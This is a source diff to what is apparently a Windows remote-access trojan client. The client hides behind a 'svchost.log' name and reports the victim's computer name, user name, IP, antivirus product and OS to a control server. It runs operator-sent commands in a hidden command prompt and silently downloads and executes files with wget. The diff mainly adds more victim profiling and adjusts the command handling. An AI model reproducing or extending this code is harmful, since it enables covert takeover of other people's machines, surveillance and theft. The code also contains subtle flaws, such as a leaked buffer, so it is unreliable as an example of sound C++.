@@ -21,7 +21,7 @@
 */
 //=======================================================
 #define						AHXRLOGGER_PLUGIN // https://github.com/AHXR/ahxrlogger
-#define						DEFAULT_BUFF					9056
+#define						DEFAULT_BUFF					19056
 #define						TMPLOG							"svchost.log"
 #define						KEY_TARGET						HKEY_LOCAL_MACHINE
 #define						KEY_NON_ADMIN_TARGET			HKEY_CURRENT_USER
@@ -32,12 +32,14 @@
 #include					"ahxrwinsock.h"
 #include					"resource.h"
 #include					"json.hpp"
+#include					"info.h"
 
 #include					<ShlObj.h>
 #include					<Shellapi.h>
 #include					<fstream>
 #include					<string>
-#include					<wininet.h>
+#include					<Lmcons.h>
+
 
 using namespace				std;
 using namespace				System::Runtime::InteropServices;
@@ -55,7 +57,6 @@ AHXRCLIENT					client;
 void						onClientConnect();
 void						onClientRecData( char * data);
 DWORD WINAPI				t_ping(LPVOID lpParams);
-string						real_ip();
 
 #pragma comment				(lib, "shell32.lib")
 #pragma comment				(lib, "Advapi32.lib")
@@ -135,14 +136,63 @@ void onClientConnect() {
 	json			sys_data;
 	TCHAR			c_comp_name[ MAX_COMPUTERNAME_LENGTH + 1 ];
 	DWORD			c_comp_size;
+	DWORD			c_username_size = UNLEN + 1;
+	char			c_username[UNLEN + 1];
 
 	c_comp_size		= sizeof(c_comp_name);
 	GetComputerName(c_comp_name, &c_comp_size);
+	GetUserName(c_username, &c_username_size);
 
-	Sleep(1000);
+
 	sys_data["ID"] = c_comp_name;
+	sys_data["USER"] = c_username;
 	sys_data["IP"] = real_ip();
 	sys_data["PORT"] = str_port;
+	sys_data["AV"] = getAntivirus();
+
+	OSVERSIONINFO vi;
+	vi.dwOSVersionInfoSize = sizeof(vi);
+
+	string os_output = "Unknown"; 
+	if (GetVersionEx(&vi) != 0) {
+		switch (vi.dwMajorVersion) {
+			case 10: {
+				os_output = "Windows 10";
+				break;
+			}
+			case 6: {
+				if (vi.dwMinorVersion == 3)
+					os_output = "Windows 8.1";
+				else if (vi.dwMinorVersion == 2)
+					os_output = "Windows 8";
+				else if (vi.dwMinorVersion == 1)
+					os_output = "Windows 7";
+				else
+					os_output = "Windows Vista";
+				break;
+			}
+			case 5: {
+				if (vi.dwMinorVersion == 2)
+					os_output = "Windows Server 2003 R2";
+				else if (vi.dwMinorVersion == 1)
+					os_output = "Windows XP";
+				else if (vi.dwMinorVersion == 0)
+					os_output = "Windows 2000";
+				break;
+			}
+			default: {
+				os_output = "Unknown";
+				break;
+			}
+		}
+
+#ifdef _WIN32
+		os_output += " 32-bit";
+#elif _WIN64
+		os_output += " 64-bit";
+#endif
+	}
+	sys_data["OS"] = os_output;
 
 	client.send_data(sys_data.dump().c_str());
 
@@ -152,14 +202,17 @@ void onClientConnect() {
 void onClientRecData( char * data ) {
 	int i_len			= strlen(data) + MAX_PATH + 1;
 	char * c_output		= new char[i_len];
+	char * c_new_data = new char[strlen(data) + 1];
+
+	c_new_data = data;
 	c_output[i_len - 1] = '\0';
 
 	/*
 		The keyword "ghost_ping" is strictly for the server to determine whether the socket is 
 		active or not. Any data that is simply "ghost_ping" will be ignored.
 	*/
-	if (strcmp(data, "ghost_ping") != 0) {
-		if (!strcmp(data, "CMD"))  // Toggling Command Prompt response
+	if (strcmp(c_new_data, "ghost_ping") != 0) {
+		if (!strcmp(c_new_data, "CMD")) // Toggling Command Prompt response 
 			b_cmd = !b_cmd;
 		else {
 			if (b_cmd) {
@@ -167,7 +220,7 @@ void onClientRecData( char * data ) {
 				int				i_length;
 				fstream			f_response;
 
-				sprintf(c_output, "/C %s > %s", data, c_temp_cmd);
+				sprintf(c_output, "/C %s > %s", c_new_data, c_temp_cmd);
 
 				/*
 					Running the command without a window. Using WinExec, system, or ShellExecute will make
@@ -177,7 +230,7 @@ void onClientRecData( char * data ) {
 				STARTUPINFO info = { sizeof(info) };
 				PROCESS_INFORMATION processInfo;
 				if (CreateProcess(c_cmd_dir, c_output, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &info, &processInfo)) {
-					WaitForSingleObject(processInfo.hProcess, INFINITE);
+					WaitForSingleObject(processInfo.hProcess, 5000);
 					CloseHandle(processInfo.hProcess);
 					CloseHandle(processInfo.hThread);
 				}
@@ -213,7 +266,7 @@ void onClientRecData( char * data ) {
 			}
 
 			// "Download & Execute"
-			if (!b_cmd && strcmp(data, "CMD") != 0) {
+			if (!b_cmd && strcmp(c_new_data, "CMD") != 0) {
 				HRSRC			hr_res;
 				DWORD32			dw_res;
 				LPVOID			lp_res;
@@ -230,7 +283,7 @@ void onClientRecData( char * data ) {
 				f_wget.close();
 
 				// Fetching the sent data.
-				json j_response = json::parse(data);
+				json j_response = json::parse(c_new_data);
 				sprintf(c_output, "/C wget %s -O %s", j_response["URL"].get<string>().c_str(), j_response["FILE"].get<string>().c_str());
 	
 				// Running wget.exe in the background. Hiding the command prompt as well. Silent downloading.
@@ -264,28 +317,4 @@ void onClientRecData( char * data ) {
 			}
 		}
 	}
-}
-
-std::string real_ip() {
-
-	HINTERNET net = InternetOpen("--",
-		INTERNET_OPEN_TYPE_PRECONFIG,
-		NULL,
-		NULL,
-		0);
-
-	HINTERNET conn = InternetOpenUrl(net,
-		"https://api.ipify.org/",
-		NULL,
-		0,
-		INTERNET_FLAG_RELOAD,
-		0);
-
-	char buffer[4096];
-	DWORD read;
-
-	InternetReadFile(conn, buffer, sizeof(buffer) / sizeof(buffer[0]), &read);
-	InternetCloseHandle(net);
-
-	return std::string(buffer, read);
 }
